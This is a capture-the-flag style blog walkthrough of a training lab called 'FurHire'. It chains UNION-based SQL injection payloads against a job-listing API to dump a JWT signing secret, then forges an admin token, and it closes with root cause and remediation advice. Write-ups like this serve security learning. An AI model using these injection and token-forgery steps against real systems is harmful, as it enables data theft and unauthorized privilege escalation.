---
layout: post
title:  "BugForge - Weekly - FurHire"
date:   2026-01-11 20:00
image:  /images/bug-forge/bugforge-logo.png
tags:   [sql-injection,jwt,privilege-escalation]
categories: [BugForge,weekly,fur-hire]
---

# Weekly - FurHire
><br/><b>Vulnerabilities Covered:</b>
<br/>
SQL Injection (UNION-based)<br/>
JWT Secret Extraction<br/>
JWT Token Forgery<br/>
Privilege Escalation
<br/>
<br/>
<b>Summary:</b>
<br/>
This walkthrough demonstrates a chained attack where a SQL Injection vulnerability in the job listing API endpoint (`/api/jobs/{id}`) is manually exploited using UNION-based injection to extract the JWT signing secret from the database. The extracted secret is then used to forge an administrative JWT token by modifying the role claim, bypassing authorization controls and accessing the protected admin flag endpoint.
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://app.bugforge.io/">Bugforge.io</a>
<br/>
<br/>

## Solution

### Step 1 - Account Creation & Application Exploration

Create a new account with the **Job Seeker** role and log in to the application.

Navigate through the dashboard to understand the application structure. The key area of interest is the **Jobs** section where open positions are listed.

---

### Step 2 - Identify Potential Injection Point

Browse to the job listings and select any job position (e.g., "Guard Dog Coordinator" or "Senior Fetch Specialist").

Observe the URL structure which includes a job identifier:
```
/api/jobs/1
```

This endpoint with a numeric parameter is a prime candidate for SQL Injection testing.

---

### Step 3 - Test for SQL Injection

Test the endpoint by appending SQL syntax to the job ID:

```
GET /api/jobs/3'
```
This returns an error or "job not found" response.

```
GET /api/jobs/3 order by 1--
```
This returns a normal response, confirming SQL Injection is possible.

The difference in behavior confirms the parameter is vulnerable to SQL Injection.

---

### Step 4 - Enumerate Column Count

Use the `ORDER BY` technique to determine how many columns the original query returns:

```
GET /api/jobs/3 order by 1--    → Success
GET /api/jobs/3 order by 10--   → Success
GET /api/jobs/3 order by 16--   → Success
GET /api/jobs/3 order by 17--   → Error
```

The query fails at 17 columns, meaning the original SELECT statement returns **16 columns**.

---

### Step 5 - Identify Database Type

Use a UNION-based injection to determine the database type:

```
GET /api/jobs/3 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,sqlite_version()--
```

The response includes the SQLite version (e.g., `3.44.2`), confirming this is a **SQLite** database.

---

### Step 6 - Enumerate Database Tables

Query the SQLite system table `sqlite_master` to discover available tables:

```
GET /api/jobs/3 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,name FROM sqlite_master WHERE type='table'--
```

This reveals tables including:
- `users`
- `user_profiles`
- `companies`
- `jobs`
- `applications`
- `config`

---

### Step 7 - Extract Table Structure

Examine the structure of the `config` table:

```
GET /api/jobs/3 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,sql FROM sqlite_master WHERE name='config'--
```

This returns the CREATE statement showing the table has `key` and `value` columns - a typical key-value configuration store.

---

### Step 8 - Extract JWT Secret

Dump the contents of the config table to find the JWT signing secret:

```
GET /api/jobs/3 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,key||'='||value FROM config--
```

The response reveals:
```
jwt_secret=phonesCheeseTiramisu1199
```

The JWT signing secret has been successfully extracted.

---

### Step 9 - Decode and Forge JWT

With the JWT secret extracted from the database, use Caido's JWT Analyser extension to forge an admin token:

1. Open your browser's Developer Tools and navigate to **Application → Local Storage**
2. Copy the current JWT token value
3. In Caido, open the **JWT Analyser** extension from the left sidebar
4. Paste the token in the input field - the extension will automatically decode and display the header and payload
5. Examine the payload which contains:
   ```json
   {
     "id": 6,
     "username": "test",
     "role": "user"
   }
   ```
6. In the payload editor, modify the `role` claim from `user` to `admin`
7. Enter the extracted secret (`phonesCheeseTiramisu1199`) in the **Secret Key** field
8. Click **Sign** to generate the forged token
9. Copy the newly generated admin JWT from the output

---

### Step 10 - Access Admin Endpoint

With the forged admin JWT:

1. Open your browser's Developer Tools → Application → Local Storage
2. Replace the existing JWT token with the forged admin token
3. Navigate to `/admin`

The server validates the JWT signature using the secret (which matches since we extracted it), recognizes the `admin` role, and grants access to the admin panel revealing the flag.

---

### Impact
- Extraction of sensitive data from the database via SQL Injection
- Compromise of JWT signing secret enabling token forgery
- Complete authorization bypass through privilege escalation
- Access to administrative functionality and sensitive data

---

### Vulnerability Classification
- **OWASP Top 10:** Injection / Broken Access Control
- **Vulnerability Type:** SQL Injection (UNION-based), Insecure JWT Implementation
- **Attack Chain:** SQLi → Secret Extraction → Token Forgery → Privilege Escalation
- **CWE:**
  - CWE-89 - Improper Neutralization of Special Elements used in an SQL Command
  - CWE-798 - Use of Hard-coded Credentials (JWT secret in database)
  - CWE-287 - Improper Authentication

---

### Root Cause
The application fails to properly sanitize user input in the job listing API endpoint, allowing SQL Injection attacks. Additionally, the JWT signing secret is stored in the database rather than in secure server-side configuration, making it accessible once database access is achieved. The combination of these issues creates a chain leading to complete authentication bypass.

---

### Remediation
- Use parameterized queries or prepared statements to prevent SQL Injection
- Store JWT secrets in secure server-side configuration (environment variables, secrets manager)
- Implement proper input validation on all user-controllable parameters
- Consider using asymmetric key algorithms (RS256) for JWT signing
- Implement rate limiting and monitoring for repeated injection attempts
- Use Web Application Firewall (WAF) as defense in depth, not primary protection

---
